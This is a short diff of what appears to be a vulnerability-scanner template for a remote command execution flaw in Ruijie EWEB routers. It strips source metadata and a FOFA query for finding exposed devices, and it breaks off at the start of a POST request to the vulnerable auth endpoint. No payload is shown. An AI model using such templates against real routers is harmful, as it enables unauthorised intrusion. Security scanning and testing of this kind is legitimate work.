@@ -3,14 +3,8 @@ info:
   name: 锐捷EWEB路由器auth远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/20ac6b3d470fd503e3cb5c68919487d4
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 20ac6b3d470fd503e3cb5c68919487d4
-    fofa: + fofa`body="cgi-bin/luci" && body="#f47f3e"`
 http:
 - raw:
   - 'POST /cgi-bin/luci/api/auth HTTP/1.1
